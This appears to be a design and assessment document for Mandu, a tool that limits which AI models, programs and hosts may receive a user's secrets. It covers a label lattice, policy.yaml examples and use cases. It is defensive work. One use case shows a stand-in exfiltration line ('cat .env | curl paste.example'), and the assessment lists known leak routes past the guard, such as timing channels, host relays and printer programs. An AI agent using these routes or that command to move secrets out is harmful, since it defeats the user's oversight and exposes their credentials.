Part 1

The lattice

Every protected datum carries one composed label: an integrity half (trusted / untrusted, now frozen) and a confidentiality half with four levels. The confidentiality levels form a total order, because each level's restriction set strictly contains the one below it.

Where the order stops: destinations are sets

A total order of four points cannot say anything about hosts or programs. Plan 13 makes the label set-valued: each datum has a release set of sinks, ordered by reverse inclusion (fewer sinks means more secret). On the model sinks alone that set is exactly the level, so the levels stay a total order there.

Release(d) = Models(level(d)) ∪ Bindings(d) ∪ {human, local storage} Models(public) = every sink Models(any-model) = every declared model (main model, helper) Models(local-model) = the declared local: true models Models(no-model) = ∅ L1 ⊑ L2 ⟺ Release(L1) ⊇ Release(L2) Release(d1 ⊔ d2) = Release(d1) ∩ Release(d2) ← join is intersection

Three relations per datum

Holders shrink as they read

A holder is whoever holds raw bytes: the agent's session, one tool call's process tree, or a long-lived process. It starts with every sink, and each raw read intersects its label down. A flow needs a source event (raw read) and a sink event (connect, request, write-open, model call), in either order; the check runs at whichever comes later.

Part 2

The rules

The law is one file, policy.yaml, written only by the arbiter and compiled into an immutable policy. Its paths: entries set Release, Openers and Trust per file; user_rules: and rules: govern egress of non-secret masked data.

Part 3

How labels and policy should reach Mandu

Most users should never write the lattice down. The design rule from plan 13 §5 is that people answer questions, and policy.yaml records their answers. Five levels of effort, cheapest first. Each one is a tightening that any client may apply, or a relaxation that only a human may make.

Suggestions

The ladder above works today. These are my proposals for making it easier, ranked by how much friction each removes. Each one keeps the monotonic split: an agent or a scan only proposes, and a human approves every loosening.

proposal

1. Ask about destinations, not files

Users know "this key is for Stripe" better than they know a level. When a placeholder first heads to a host, the ask should offer Always: bind .env to api.stripe.com. That binding is the only release a no-model secret needs. Plan 13 §5.4 designs this row with one Always per source; it is not built yet.

partly built

2. Read rules back as sentences

Show each file as plain sentences generated from its label: "No AI model may read it. deploy may open it. STRIPE_KEY may be sent only to api.stripe.com." Add the per-principal view too: what may deploy open, and which secrets may reach api.stripe.com. mandu why already answers both questions one at a time (plan 13 §5.3). Built 2026-10-11: each Rules row answers which AI may read it and where it may be sent, and says who opens it; the Rules page's "Who may get your secrets" card is the per-principal view, per program, host and AI (dashboard.md §4.25aa). The full sentences are left.

proposal

3. A mandu protect verb

mandu protect ~/contracts --level no-model. Plan 13 §5.1 records it as proposed; the CLI does not have it. A terminal user can then mark a file without opening the dashboard. Only tightenings are allowed, because the terminal shares a channel with the agent's programs. "Not secret" and lower levels stay on the dashboard.

proposal

4. Starter profiles

One-click bundles on first run: Developer (cloud CLIs bound to their hosts, ssh from: git), Documents (~/Documents/** at any-model with no bindings), Local model (an Ollama entry plus a local-model folder). Each bundle shows its policy.yaml diff before it applies, and every relaxation in it is listed.

proposal

5. A tighten-only project file

A repository could carry .mandu/policy.yaml with labels and patterns only (**/fixtures/*.pem at no-model), so a team shares its labels through git. Because the agent can write the repository, the file may only tighten. Bindings, readers and lower levels stay in the human's own file.

built, experimental

6. Let a model shape rules from names

mandu policy suggest --model names sends file names only, and --model contents reads documents only with your own local: true model. Both preview exactly what would be sent before sending it. A model may suggest hiding a file; only you may lower a rule. Turn it on with MANDU_EXPERIMENTAL_POLICY_MODEL=1.

First ten minutes

Use cases

Developer · API key

Keep the Stripe key from the AI, but let the deploy tool use it

The agent should be able to run deploy, but it must never see STRIPE_SECRET_KEY. The key may only go to Stripe.

Dashboard

  1. Rules › Files and folders › All files: open ~/proj. The .env row already has a ring under No AI (Built in).
  2. Click the solid dot to make it your rule, then under May still be sent to click Add, type api.stripe.com, and press Update.
  3. Save changes. Then add deploy as a reader in policy.yaml (right). The edit loosens the law, so Approvals asks you to confirm it once.

Terminal + policy.yaml

  - path: ~/proj/.env
    level: no-model
    bindings: [api.stripe.com]
    readers: [{ app: deploy, prints: nothing }]
    others: twin
$ mandu why ~/proj/.env --to api.stripe.com

The AI sees STRIPE_SECRET_KEY=$MDU:nomodel_Read[9bbd].STRIPE_SECRET_KEY. deploy reads the real file, and the key reaches api.stripe.com only. cat .env | curl paste.example carries a placeholder, and a process holding the key cannot send it anywhere else without your OK.

Analyst · documents

Let the AI summarize contracts, but never send them out

Contracts are covered by the vendor's zero-retention agreement, so the model may read them. They must not leave the machine, except as email through Gmail.

Dashboard

  1. Rules › Files and folders: type ~/contracts and click the Any AI, when it asks dot.
  2. Under May still be sent to, add smtp.gmail.com.
  3. Save. The page lists any part that weakens protection for you to check first, and you can add a reason that History keeps.

policy.yaml

  - path: ~/contracts/**
    level: any-model
    bindings: [smtp.gmail.com]

"Summarize nda.pdf" runs as a quarantined read: a separate model call reads the file and returns a placeholder that you see expanded. If the main model must read it in context, that read is logged, and every later send from the session needs a bound host or your OK (the watermark).

Everyone · git over ssh

git push works, but the agent cannot read my ssh key

What happens by default

  1. ~/.ssh/id_ed25519 is in the catalog, so it is no-model with no setup.
  2. ssh is vetted, so it may read the key. Limit it to ssh started by git.
  3. git itself is a printer, so git never gets the key file.

policy.yaml

  - path: ~/.ssh/id_ed25519
    level: no-model
    readers: [{ app: ssh, from: git }]
ssh_agent:
  readers: [ssh-add, { app: ssh, from: git }]
Gotcha · recent change

My Postgres login from ~/.pgpass stopped working

Since 2026-10-04, psql and pg_restore count as printers: psql -f, \i and \copy … from print a file, and psql runs shell commands. No entry can make them readers, and Postgres has no placeholder release on the wire. Since 2026-10-09 PGPASSWORD is masked too. The ways out:

# peer authentication over the local socket: no password at all
#   unix_sockets: { allow: [/var/run/postgresql] }   (~/.mandu/policy.yaml)
# or let the AI read the password: exempt it, then launch with it
#   env: { exempt: [PGPASSWORD] }
$ PGPASSWORD=… mandu claude
# or vouch for pg_dump, or a program of yours (never psql), as the reader, and bind the database:
#   readers: [{ app: pg_dump, prints: nothing }]   bindings: ["db.internal:5432"]
$ mandu why ~/.pgpass      # names psql as a printer and says why

Dashboard · Settings › Sensitivity labels

  1. The list shows each label found in your Office files, with a file count.
  2. Name each one and pick a level, for example Highly Confidential → no-model, General → public.

sensitivity_labels:

Mandu reads only the label id, never the document text. An administrator can map labels for everyone under /etc/mandu/policy.d/. Your mapping can raise theirs but never lower it.

Part 5

Adopting the reader-set model: what is good and what is bad

Most of Plan 13 is built: D1 to D9 are fixed, along with the intersection join, output: on the reader entry, labels by reference, the flow rules and the reader allow-list. Adopting it means accepting the model as the end state and finishing what is not built yet: values:, the This session scope, the sentences, the per-principal view, one Always per source, synced folders and typed quarantined results. This assessment is dated 2026-10-04.

Good

  • One check for every flow. Label(holder) = ∩ Release(d), checked at the later of the source and sink events, answers the model, network, write and pipeline exits alike. D1 (union) and D2 (pipelines) became visible as departures from one formula.
  • Three questions kept apart. Release travels with the data, Openers is checked at the open, and Trust affects only what the model sees. output: clear cannot become an exfiltration rule.
  • Fail-closed by construction. The join is intersection, copies are evaluated live against their sources, unknown or cyclic sources are bound nowhere, and since D8 (12) the reader list is an allow-list, so a newly found printer is closed by default.
  • The user sees a ladder. On models, the levels stay a total order (the four columns of the Rules page). Only destinations are set-valued, and they already were (bindings).
  • The provider is a sink. At no-model, even the quarantined helper never sees the bytes. That gives data residency while still using vendor models.
  • The monotonic split. The agent and the scans can only tighten. Every loosening is a human act on a channel the agent cannot reach.

Bad

  • Intersection costs utility, paid in asks. A holder of two differently bound secrets may send nowhere, and a session's destinations can empty after two rung-3 reads with no display (R3 left). One Always per source is not built (R2). Users approve about 97% of permission prompts, so asks risk becoming rubber stamps.
  • prints: nothing is the weak point. Only ssh and ssh-add are vetted. aws, kubectl, helm and docker need the human's word, and the word is unchecked (kubectl config view --raw prints the file it would vouch for). A ~/.pgpass login fails.
  • Usability leans on TLS inspection. Unvetted HTTPS clients work because the proxy puts the value back at a bound host. Non-HTTP protocols (Postgres) and pinned certificates get no release.
  • Many knobs. A level, bindings, readers, prints, output, mask, others, from, script, sha256, and later values:. The read-back that makes answering questions safe (the sentences and the per-principal view) is not built.
  • Tree-wide taint over-masks. Programs are not sinks, so one raw read makes the whole call's output secret by default. Plan 10's spike measured about 1% of tool results masked before readers: were in wide use.
  • Soundness is claimed, not proven (§6.3 item 1). The §4.9 leftovers remain: names, timing and signal channels, host relays, an inbound accept, a Unix socket connected before the taint, the guard-only lstat. No live drill combines readers across two files, a pipeline and a redirect. macOS is deny-only and unverified.
  • Ongoing maintenance. The printer and code-runner lists are kept in three copies, every vetted reader needs a probe on a real host, and a mislabeled secret still leaks silently.

Recommendation

  1. Canonical catalog bindings (R5). The AWS symbol releases at *.amazonaws.com with no policy.yaml. This removes the commonest asks.
  2. Make the intersection visible. Name the blocking source, with one Always per source (R2). Show the session's destinations, and ask before a rung-3 read empties them (R3).
  3. Probe, then vet. Probe aws, gh, kubectl and pg_dump to grow the vetted list, rather than relying on prints: nothing. When a user is asked to vouch, show that program's known printing subcommands.
  4. Build the read-back. The per-principal view and the rule sentences (§5.3).
  5. Typed quarantined results (§6.4). A bool or closed enum from the helper, so that any-model and local-model tasks rarely need rung 3.
  6. Measure. Track the ask rate and the masked-result rate in live drills. If either climbs, the design is failing on utility, not on security.
